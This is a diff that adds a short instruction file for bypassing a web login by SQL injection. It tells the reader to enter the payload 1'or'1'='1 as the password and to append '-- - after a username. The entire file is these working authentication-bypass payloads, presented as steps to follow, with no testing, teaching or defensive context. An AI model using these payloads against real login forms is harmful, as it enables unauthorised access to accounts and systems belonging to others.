@@ -1,0 +1,8 @@
+@ password type following code:
+
+
+1'or'1'='1
+
+@ username type the following code after typing user name
+
+'-- -
